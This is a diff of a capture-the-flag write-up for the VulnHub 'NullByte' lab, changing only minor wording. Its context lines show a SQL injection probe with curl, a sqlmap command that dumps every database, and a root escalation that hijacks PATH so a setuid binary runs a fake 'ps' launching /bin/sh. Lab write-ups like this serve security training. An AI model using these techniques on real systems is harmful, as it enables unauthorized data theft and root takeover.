@@ -92,12 +92,13 @@ Good stuff the password is "elite" then. Entering that we get to some kind of us
 So by accident I submit it with nothing and it spits back a couple employees...
 
 ![](pics/5.PNG)
+
 We also see a nice sql error if you submit with "". 
 ```
 root@sushi:~/vulnhub/nullbyte# curl http://192.168.147.166/kzMb5nVYJw/420search.php?usrtosearch=%27%27%22
 Could not get data: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%"' at line 1
 ```
-At this point we get stuck for awhile trying to get anything from this, and then eventually just give up and use sqlmap.
+At this point we get stuck for awhile trying to get anything from this sql error, and then eventually just give up and use sqlmap.
 ```
 root@sushi:~# sqlmap --url="http://192.168.147.166/kzMb5nVYJw/420search.php?usrtosearch=a*" --dbms=MySQL --dump-all --level=5 --risk=3
 ```
@@ -214,7 +215,7 @@ ramses@NullByte:/var/www/backup$ objdump -D procwatch | grep "<main>" -A 30
  804843c:       66 90                   xchg   %ax,%ax
  804843e:       66 90                   xchg   %ax,%ax
 ```
-Looking through that for awhile, it seems to be loading the hex 0x73 and 0x70 characters into EAX followed by a null, then calling a system function. Seeing as how that translates to "ps", we take a wild guess and assume that this setuid procwatch executable is calling "ps" without specifying a path. If we can just set the PATH variable to a folder we can write into, then anything named "ps" in there will run instead of the original "ps" at /bin/ps. In this case it will just run /bin/sh as root and game over.
+Looking through that for awhile, it seems to be loading the hex 0x73 and 0x70 characters into EAX followed by a null, then calling a system function. Seeing as how that translates to "ps", we take a wild guess and assume that this setuid procwatch executable is calling "ps" without specifying a path. If we can just set the PATH variable to a folder we can write into, then anything named "ps" in there will run instead of the original "ps" at /bin/ps. In our case it will just run /bin/sh as root and game over.
 ```
 ramses@NullByte:/var/www/backup$ export PATH=/var/www/backup:${PATH}
 ramses@NullByte:/var/www/backup$ echo '/bin/sh' > ps && chmod +x ps                                                                                                                                          
@@ -263,7 +264,7 @@ Gms=
 =PiAQ
 -----END PGP PUBLIC KEY BLOCK-----
 ```
-Thanks ly0n that was pretty sweet and as always thanks to Vulnhub.
+Thanks ly0n that was pretty sweet with a nice variety of things to acomplish even though we got lazy and ended up using sqlmap. And as always thanks to the Vulnhub crew.
 
 
 
